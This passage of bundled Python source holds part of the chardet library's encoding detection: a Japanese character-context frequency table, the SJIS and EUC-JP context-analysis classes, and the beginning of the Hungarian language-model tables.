,4,5,5,1,3,4,5,3,1,4,3,1,3,3,0,3,3,1,4,3,1,4,5,3,3,5,0,4,0,3,0,5,3,3,1,4,3,0,4,0,1,5,3),\n(0,5,0,5,0,4,0,2,0,4,4,3,4,3,3,3,3,3,5,4,4,4,4,4,4,5,3,3,5,2,4,4,4,3,4,4,3,3,4,4,5,5,3,3,4,3,4,3,3,4,3,3,3,3,1,2,2,1,4,3,3,5,4,4,3,4,0,4,0,3,0,4,4,4,4,4,1,0,4,2,0,2,4),\n(0,4,0,4,0,3,0,1,0,3,5,2,3,0,3,0,2,1,4,2,3,3,4,1,4,3,3,2,4,1,3,3,3,0,3,3,0,0,3,3,3,5,3,3,3,3,3,2,0,2,0,0,2,0,0,2,0,0,1,0,0,3,1,2,2,3,0,3,0,2,0,4,4,3,3,4,1,0,3,0,0,2,4),\n(0,0,0,4,0,0,0,0,0,0,1,0,1,0,2,0,0,0,0,0,1,0,2,0,1,0,0,0,0,0,3,1,3,0,3,2,0,0,0,1,0,3,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,4,0,2,0,0,0,0,0,0,2),\n(0,2,1,3,0,2,0,2,0,3,3,3,3,1,3,1,3,3,3,3,3,3,4,2,2,1,2,1,4,0,4,3,1,3,3,3,2,4,3,5,4,3,3,3,3,3,3,3,0,1,3,0,2,0,0,1,0,0,1,0,0,4,2,0,2,3,0,3,3,0,3,3,4,2,3,1,4,0,1,2,0,2,3),\n(0,3,0,3,0,1,0,3,0,2,3,3,3,0,3,1,2,0,3,3,2,3,3,2,3,2,3,1,3,0,4,3,2,0,3,3,1,4,3,3,2,3,4,3,1,3,3,1,1,0,1,1,0,1,0,1,0,1,0,0,0,4,1,1,0,3,0,3,1,0,2,3,3,3,3,3,1,0,0,2,0,3,3),\n(0,0,0,0,0,0,0,0,0,0,3,0,2,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,3,0,3,1,0,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,2,0,2,3,0,0,0,0,0,0,0,0,3),\n(0,2,0,3,1,3,0,3,0,2,3,3,3,1,3,1,3,1,3,1,3,3,3,1,3,0,2,3,1,1,4,3,3,2,3,3,1,2,2,4,1,3,3,0,1,4,2,3,0,1,3,0,3,0,0,1,3,0,2,0,0,3,3,2,1,3,0,3,0,2,0,3,4,4,4,3,1,0,3,0,0,3,3),\n(0,2,0,1,0,2,0,0,0,1,3,2,2,1,3,0,1,1,3,0,3,2,3,1,2,0,2,0,1,1,3,3,3,0,3,3,1,1,2,3,2,3,3,1,2,3,2,0,0,1,0,0,0,0,0,0,3,0,1,0,0,2,1,2,1,3,0,3,0,0,0,3,4,4,4,3,2,0,2,0,0,2,4),\n(0,0,0,1,0,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,3,1,0,0,0,0,0,0,0,3),\n(0,3,0,3,0,2,0,3,0,3,3,3,2,3,2,2,2,0,3,1,3,3,3,2,3,3,0,0,3,0,3,2,2,0,2,3,1,4,3,4,3,3,2,3,1,5,4,4,0,3,1,2,1,3,0,3,1,1,2,0,2,3,1,3,1,3,0,3,0,1,0,3,3,4,4,2,1,0,2,1,0,2,4),\n(0,1,0,3,0,1,0,2,0,1,4,2,5,1,4,0,2,0,2,1,3,1,4,0,2,1,0,0,2,1,4,1,1,0,3,3,0,5,1,3,2,3,3,1,0,3,2,3,0,1,0,0,0,0,0,0,1,0,0,0,0,4,0,1,0,3,0,2,0,1,0,3,3,3,4,3,3,0,0,0,0,2,3),\n(0,0,0,1,0,0,0,0,0,0,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,0,1,0,0,0,0,0,3),\n(0,1,0,3,0,4,0,3,0,2,4,3,1,0,3,2,2,1,3,1,2,2,3,1,1,1,2,1,3,0,1,2,0,1,3,2,1,3,0,5,5,1,0,0,1,3,2,1,0,3,0,0,1,0,0,0,0,0,3,4,0,1,1,1,3,2,0,2,0,1,0,2,3,3,1,2,3,0,1,0,1,0,4),\n(0,0,0,1,0,3,0,3,0,2,2,1,0,0,4,0,3,0,3,1,3,0,3,0,3,0,1,0,3,0,3,1,3,0,3,3,0,0,1,2,1,1,1,0,1,2,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,2,2,1,2,0,0,2,0,0,0,0,2,3,3,3,3,0,0,0,0,1,4),\n(0,0,0,3,0,3,0,0,0,0,3,1,1,0,3,0,1,0,2,0,1,0,0,0,0,0,0,0,1,0,3,0,2,0,2,3,0,0,2,2,3,1,2,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,2,0,0,0,0,2,3),\n(2,4,0,5,0,5,0,4,0,3,4,3,3,3,4,3,3,3,4,3,4,4,5,4,5,5,5,2,3,0,5,5,4,1,5,4,3,1,5,4,3,4,4,3,3,4,3,3,0,3,2,0,2,3,0,3,0,0,3,3,0,5,3,2,3,3,0,3,0,3,0,3,4,5,4,5,3,0,4,3,0,3,4),\n(0,3,0,3,0,3,0,3,0,3,3,4,3,2,3,2,3,0,4,3,3,3,3,3,3,3,3,0,3,2,4,3,3,1,3,4,3,4,4,4,3,4,4,3,2,4,4,1,0,2,0,0,1,1,0,2,0,0,3,1,0,5,3,2,1,3,0,3,0,1,2,4,3,2,4,3,3,0,3,2,0,4,4),\n(0,3,0,3,0,1,0,0,0,1,4,3,3,2,3,1,3,1,4,2,3,2,4,2,3,4,3,0,2,2,3,3,3,0,3,3,3,0,3,4,1,3,3,0,3,4,3,3,0,1,1,0,1,0,0,0,4,0,3,0,0,3,1,2,1,3,0,4,0,1,0,4,3,3,4,3,3,0,2,0,0,3,3),\n(0,3,0,4,0,1,0,3,0,3,4,3,3,0,3,3,3,1,3,1,3,3,4,3,3,3,0,0,3,1,5,3,3,1,3,3,2,5,4,3,3,4,5,3,2,5,3,4,0,1,0,0,0,0,0,2,0,0,1,1,0,4,2,2,1,3,0,3,0,2,0,4,4,3,5,3,2,0,1,1,0,3,4),\n(0,5,0,4,0,5,0,2,0,4,4,3,3,2,3,3,3,1,4,3,4,1,5,3,4,3,4,0,4,2,4,3,4,1,5,4,0,4,4,4,4,5,4,1,3,5,4,2,1,4,1,1,3,2,0,3,1,0,3,2,1,4,3,3,3,4,0,4,0,3,0,4,4,4,3,3,3,0,4,2,0,3,4),\n(1,4,0,4,0,3,0,1,0,3,3,3,1,1,3,3,2,2,3,3,1,0,3,2,2,1,2,0,3,1,2,1,2,0,3,2,0,2,2,3,3,4,3,0,3,3,1,2,0,1,1,3,1,2,0,0,3,0,1,1,0,3,2,2,3,3,0,3,0,0,0,2,3,3,4,3,3,0,1,0,0,1,4),\n(0,4,0,4,0,4,0,0,0,3,4,4,3,1,4,2,3,2,3,3,3,1,4,3,4,0,3,0,4,2,3,3,2,2,5,4,2,1,3,4,3,4,3,1,3,3,4,2,0,2,1,0,3,3,0,0,2,0,3,1,0,4,4,3,4,3,0,4,0,1,0,2,4,4,4,4,4,0,3,2,0,3,3),\n(0,0,0,1,0,4,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,3,2,0,0,1,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,2),\n(0,2,0,3,0,4,0,4,0,1,3,3,3,0,4,0,2,1,2,1,1,1,2,0,3,1,1,0,1,0,3,1,0,0,3,3,2,0,1,1,0,0,0,0,0,1,0,2,0,2,2,0,3,1,0,0,1,0,1,1,0,1,2,0,3,0,0,0,0,1,0,0,3,3,4,3,1,0,1,0,3,0,2),\n(0,0,0,3,0,5,0,0,0,0,1,0,2,0,3,1,0,1,3,0,0,0,2,0,0,0,1,0,0,0,1,1,0,0,4,0,0,0,2,3,0,1,4,1,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,1,0,0,0,0,0,0,0,2,0,0,3,0,0,0,0,0,3),\n(0,2,0,5,0,5,0,1,0,2,4,3,3,2,5,1,3,2,3,3,3,0,4,1,2,0,3,0,4,0,2,2,1,1,5,3,0,0,1,4,2,3,2,0,3,3,3,2,0,2,4,1,1,2,0,1,1,0,3,1,0,1,3,1,2,3,0,2,0,0,0,1,3,5,4,4,4,0,3,0,0,1,3),\n(0,4,0,5,0,4,0,4,0,4,5,4,3,3,4,3,3,3,4,3,4,4,5,3,4,5,4,2,4,2,3,4,3,1,4,4,1,3,5,4,4,5,5,4,4,5,5,5,2,3,3,1,4,3,1,3,3,0,3,3,1,4,3,4,4,4,0,3,0,4,0,3,3,4,4,5,0,0,4,3,0,4,5),\n(0,4,0,4,0,3,0,3,0,3,4,4,4,3,3,2,4,3,4,3,4,3,5,3,4,3,2,1,4,2,4,4,3,1,3,4,2,4,5,5,3,4,5,4,1,5,4,3,0,3,2,2,3,2,1,3,1,0,3,3,3,5,3,3,3,5,4,4,2,3,3,4,3,3,3,2,1,0,3,2,1,4,3),\n(0,4,0,5,0,4,0,3,0,3,5,5,3,2,4,3,4,0,5,4,4,1,4,4,4,3,3,3,4,3,5,5,2,3,3,4,1,2,5,5,3,5,5,2,3,5,5,4,0,3,2,0,3,3,1,1,5,1,4,1,0,4,3,2,3,5,0,4,0,3,0,5,4,3,4,3,0,0,4,1,0,4,4),\n(1,3,0,4,0,2,0,2,0,2,5,5,3,3,3,3,3,0,4,2,3,4,4,4,3,4,0,0,3,4,5,4,3,3,3,3,2,5,5,4,5,5,5,4,3,5,5,5,1,3,1,0,1,0,0,3,2,0,4,2,0,5,2,3,2,4,1,3,0,3,0,4,5,4,5,4,3,0,4,2,0,5,4),\n(0,3,0,4,0,5,0,3,0,3,4,4,3,2,3,2,3,3,3,3,3,2,4,3,3,2,2,0,3,3,3,3,3,1,3,3,3,0,4,4,3,4,4,1,1,4,4,2,0,3,1,0,1,1,0,4,1,0,2,3,1,3,3,1,3,4,0,3,0,1,0,3,1,3,0,0,1,0,2,0,0,4,4),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,3,0,3,0,2,0,3,0,1,5,4,3,3,3,1,4,2,1,2,3,4,4,2,4,4,5,0,3,1,4,3,4,0,4,3,3,3,2,3,2,5,3,4,3,2,2,3,0,0,3,0,2,1,0,1,2,0,0,0,0,2,1,1,3,1,0,2,0,4,0,3,4,4,4,5,2,0,2,0,0,1,3),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,1,0,0,1,1,0,0,0,4,2,1,1,0,1,0,3,2,0,0,3,1,1,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,1,0,0,0,2,0,0,0,1,4,0,4,2,1,0,0,0,0,0,1),\n(0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,0,0,0,0,3,1,0,0,0,2,0,2,1,0,0,1,2,1,0,1,1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,1,3,1,0,0,0,0,0,1,0,0,2,1,0,0,0,0,0,0,0,0,2),\n(0,4,0,4,0,4,0,3,0,4,4,3,4,2,4,3,2,0,4,4,4,3,5,3,5,3,3,2,4,2,4,3,4,3,1,4,0,2,3,4,4,4,3,3,3,4,4,4,3,4,1,3,4,3,2,1,2,1,3,3,3,4,4,3,3,5,0,4,0,3,0,4,3,3,3,2,1,0,3,0,0,3,3),\n(0,4,0,3,0,3,0,3,0,3,5,5,3,3,3,3,4,3,4,3,3,3,4,4,4,3,3,3,3,4,3,5,3,3,1,3,2,4,5,5,5,5,4,3,4,5,5,3,2,2,3,3,3,3,2,3,3,1,2,3,2,4,3,3,3,4,0,4,0,2,0,4,3,2,2,1,2,0,3,0,0,4,1),\n)\n\nclass JapaneseContextAnalysis(object):\n    NUM_OF_CATEGORY = 6\n    DONT_KNOW = -1\n    ENOUGH_REL_THRESHOLD = 100\n    MAX_REL_THRESHOLD = 1000\n    MINIMUM_DATA_THRESHOLD = 4\n\n    def __init__(self):\n        self._total_rel = None\n        self._rel_sample = None\n        self._need_to_skip_char_num = None\n        self._last_char_order = None\n        self._done = None\n        self.reset()\n\n    def reset(self):\n        self._total_rel = 0  # total sequence received\n        # category counters, each integer counts sequence in its category\n        self._rel_sample = [0] * self.NUM_OF_CATEGORY\n        # if last byte in current buffer is not the last byte of a character,\n        # we need to know how many bytes to skip in next buffer\n        self._need_to_skip_char_num = 0\n        self._last_char_order = -1  # The order of previous char\n        # If this flag is set to True, detection is done and conclusion has\n        # been made\n        self._done = False\n\n    def feed(self, byte_str, num_bytes):\n        if self._done:\n            return\n\n        # The buffer we got is byte oriented, and a character may span in more than one\n        # buffers. In case the last one or two byte in last buffer is not\n        # complete, we record how many byte needed to complete that character\n        # and skip these bytes here.  We can choose to record those bytes as\n        # well and analyse the character once it is complete, but since a\n        # character will not make much difference, by simply skipping\n        # this character will simply our logic and improve performance.\n        i = self._need_to_skip_char_num\n        while i < num_bytes:\n            order, char_len = self.get_order(byte_str[i:i + 2])\n            i += char_len\n            if i > num_bytes:\n                self._need_to_skip_char_num = i - num_bytes\n                self._last_char_order = -1\n            else:\n                if (order != -1) and (self._last_char_order != -1):\n                    self._total_rel += 1\n                    if self._total_rel > self.MAX_REL_THRESHOLD:\n                        self._done = True\n                        break\n                    self._rel_sample[jp2CharContext[self._last_char_order][order]] += 1\n                self._last_char_order = order\n\n    def got_enough_data(self):\n        return self._total_rel > self.ENOUGH_REL_THRESHOLD\n\n    def get_confidence(self):\n        # This is just one way to calculate confidence. It works well for me.\n        if self._total_rel > self.MINIMUM_DATA_THRESHOLD:\n            return (self._total_rel - self._rel_sample[0]) / self._total_rel\n        else:\n            return self.DONT_KNOW\n\n    def get_order(self, byte_str):\n        return -1, 1\n\nclass SJISContextAnalysis(JapaneseContextAnalysis):\n    def __init__(self):\n        super(SJISContextAnalysis, self).__init__()\n        self._charset_name = \"SHIFT_JIS\"\n\n    @property\n    def charset_name(self):\n        return self._charset_name\n\n    def get_order(self, byte_str):\n        if not byte_str:\n            return -1, 1\n        # find out current char's byte length\n        first_char = byte_str[0]\n        if (0x81 <= first_char <= 0x9F) or (0xE0 <= first_char <= 0xFC):\n            char_len = 2\n            if (first_char == 0x87) or (0xFA <= first_char <= 0xFC):\n                self._charset_name = \"CP932\"\n        else:\n            char_len = 1\n\n        # return its order if it is hiragana\n        if len(byte_str) > 1:\n            second_char = byte_str[1]\n            if (first_char == 202) and (0x9F <= second_char <= 0xF1):\n                return second_char - 0x9F, char_len\n\n        return -1, char_len\n\nclass EUCJPContextAnalysis(JapaneseContextAnalysis):\n    def get_order(self, byte_str):\n        if not byte_str:\n            return -1, 1\n        # find out current char's byte length\n        first_char = byte_str[0]\n        if (first_char == 0x8E) or (0xA1 <= first_char <= 0xFE):\n            char_len = 2\n        elif first_char == 0x8F:\n            char_len = 3\n        else:\n            char_len = 1\n\n        # return its order if it is hiragana\n        if len(byte_str) > 1:\n            second_char = byte_str[1]\n            if (first_char == 0xA4) and (0xA1 <= second_char <= 0xF3):\n                return second_char - 0xA1, char_len\n\n        return -1, char_len\n\n\n", "thirdparty/chardet/langhungarianmodel.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# 255: Control characters that usually does not exist in any text\n# 254: Carriage/Return\n# 253: symbol (punctuation) that does not belong to word\n# 252: 0 - 9\n\n# Character Mapping Table:\nLatin2_HungarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,\n 46, 71, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,\n253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,\n 23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,\n159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,\n175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,\n191,192,193,194,195,196,197, 75,198,199,200,201,202,203,204,205,\n 79,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,\n221, 51, 81,222, 78,223,224,225,226, 44,227,228,229, 61,230,231,\n232,233,234, 58,235, 66, 59,236,237,238, 60, 69, 63,239,240,241,\n 82, 14, 74,242, 70, 80,243, 72,244, 15, 83, 77, 84, 30, 76, 85,\n245,246,247, 25, 73, 42, 24,248,249,250, 31, 56, 29,251,252,253,\n)\n\nwin1250HungarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,\n 46, 72, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,\n253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,\n 23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,\n161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,\n177,178,179,180, 78,181, 69,182,183,184,185,186,187,188,189,190,\n191,192,193,194,195,196,197, 76,198,199,200,201,202,203,204,205,\n 81,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,\n221, 51, 83,222, 80,223,224,225,226, 44,227,228,229, 61,230,231,\n232,233,234, 58,235, 66, 59,236,237,238, 60, 70, 63,239,240,241,\n 84, 14, 75,242, 71, 82,243, 73,244, 15, 85, 79, 86, 30, 77, 87,\n245,246,247, 25, 74, 42, 24,248,249,250, 31, 56, 29,251,252,253,\n)\n\n# Model Table:\n# total sequences: 100%\n# first 512 sequences: 94.7368%\n# first 1024 sequences:5.2623%\n# rest  sequences:     0.8894%\n# negative sequences:  0.0009%\nHungarianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,\n3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,2,3,3,1,1,2,2,2,2,2,1,2,\n3,2,2,3,3,3,3,3,2,3,3,3,3,3,3,1,2,3,3,3,3,2,3,3,1,1,3,3,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,\n3,2,1,3,3,3,3,3,2,3,3,3,3,3,1,1,2,3,3,3,3,3,3,3,1,1,3,2,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,1,1,2,3,3,3,1,3,3,3,3,3,1,3,3,2,2,0,3,2,3,\n0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,3,3,2,3,3,2,2,3,2,3,2,0,3,2,2,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,\n3,3,3,3,3,3,2,3,3,3,3,3,2,3,3,3,1,2,3,2,2,3,1,2,3,3,2,2,0,3,3,3,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,3,2,3,3,3,3,2,3,3,3,3,0,2,3,2,\n0,0,0,1,1,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,1,1,1,3,3,2,1,3,2,2,3,2,1,3,2,2,1,0,3,3,1,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,2,2,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,3,2,2,3,1,1,3,2,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,2,2,3,3,3,3,3,2,1,3,3,3,3,3,2,2,1,3,3,3,0,1,1,2,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,2,0,3,2,3,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,1,0,\n3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,1,3,2,2,2,3,1,1,3,3,1,1,0,3,3,2,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,2,3,3,3,2,3,2,3,3,3,2,3,3,3,3,3,1,2,3,2,2,0,2,2,2,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,2,2,2,3,1,3,3,2,2,1,3,3,3,1,1,3,1,2,3,2,3,2,2,2,1,0,2,2,2,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,\n3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,2,1,3,3,3,2,2,3,2,1,0,3,2,0,1,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,3,3,3,3,3,1,2,3,3,3,3,1,1,0,3,3,3,3,0,2,3,0,0,2,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,2,3,3,2,2,2,2,3,3,0,1,2,3,2,3,2,2,3,2,1,2,0,2,2,2,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,\n3,3,3,3,3,3,1,2,3,3,3,2,1,2,3,3,2,2,2,3,2,3,3,1,3,3,1,1,0,2,3,2,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,1,2,2,2,2,3,3,3,1,1,1,3,3,1,1,3,1,1,3,2,1,2,3,1,1,0,2,2,2,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,2,1,2,1,1,3,3,1,1,1,1,3,3,1,1,2,2,1,2,1,1,2,2,1,1,0,2,2,1,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,1,1,2,1,1,3,3,1,0,1,1,3,3,2,0,1,1,2,3,1,0,2,2,1,0,0,1,3,2,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,2,1,3,3,3,3,3,1,2,3,2,3,3,2,1,1,3,2,3,2,1,2,2,0,1,2,1,0,0,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,2,2,2,2,3,1,2,2,1,1,3,3,0,3,2,1,2,3,2,1,3,3,1,1,0,2,1,3,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,3,3,2,2,2,3,2,3,3,3,2,1,1,3,3,1,1,1,2,2,3,2,3,2,2,2,1,0,2,2,1,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n1,0,0,3,3,3,3,3,0,0,3,3,2,3,0,0,0,2,3,3,1,0,1,2,0,0,1,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,2,3,3,3,3,3,1,2,3,3,2,2,1,1,0,3,3,2,2,1,2,2,1,0,2,2,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,2,2,1,3,1,2,3,3,2,2,1,1,2,2,1,1,1,1,3,2,1,1,1,1,2,1,0,1,2,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n2,3,3,1,1,1,1,1,3,3,3,0,1,1,3,3,1,1,1,1,1,2,2,0,3,1,1,2,0,2,1,1,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,\n3,1,0,1,2,1,2,2,0,1,2,3,1,2,0,0,0,2,1,1,1,1,1,2,0,0,1,1,0,0,0,0,\n1,2,1,2,2,2,1,2,1,2,0,2,0,2,2,1,1,2,1,1,2,1,1,1,0,1,0,0,0,1,1,0,\n1,1,1,2,3,2,3,3,0,1,2,2,3,1,0,1,0,2,1,2,2,0,1,1,0,0,1,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,3,3,2,2,1,0,0,3,2,3,2,0,0,0,1,1,3,0,0,1,1,0,0,2,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,2,2,3,3,1,0,1,3,2,3,1,1,1,0,1,1,1,1,1,3,1,0,0,2,2,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,1,2,2,2,1,0,1,2,3,3,2,0,0,0,2,1,1,1,2,1,1,1,0,1,1,1,0,0,0,\n1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,2,1,1,1,1,1,1,0,1,1,1,0,0,1,1,\n3,2,2,1,0,0,1,1,2,2,0,3,0,1,2,1,1,0,0,1,1,1,0,1,1,1,1,0,2,1,1,1,\n2,2,1,1,1,2,1,2,1,1,1,1,1,1,1,2,1,1,1,2,3,1,1,1,1,1,1,1,1,1,0,1,\n2,3,3,0,1,0,0,0,3,3,1,0,0,1,2,2,1,0,0,0,0,2,0,0,1,1,1,0,2,1,1,1,\n2,1,1,1,1,1,1,2,1,1,0,1,1,0,1,1,1,0,1,2,1,1,0,1,1,1,1,1,1,1,0,1,\n2,3,3,0,1,0,0,0,2,2,0,0,0,0,1,2,2,0,0,0,0,1,0,0,1,1,0,0,2,0,1,0,\n2,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,\n3,2,2,0,1,0,1,0,2,3,2,0,0,1,2,2,1,0,0,1,1,1,0,0,2,1,0,1,2,2,1,1,\n2,1,1,1,1,1,1,2,1,1,1,1,1,1,0,2,1,0,1,1,0,1,1,1,0,1,1,2,1,1,0,1,\n2,2,2,0,0,1,0,0,2,2,1,1,0,0,2,1,1,0,0,0,1,2,0,0,2,1,0,0,2,1,1,1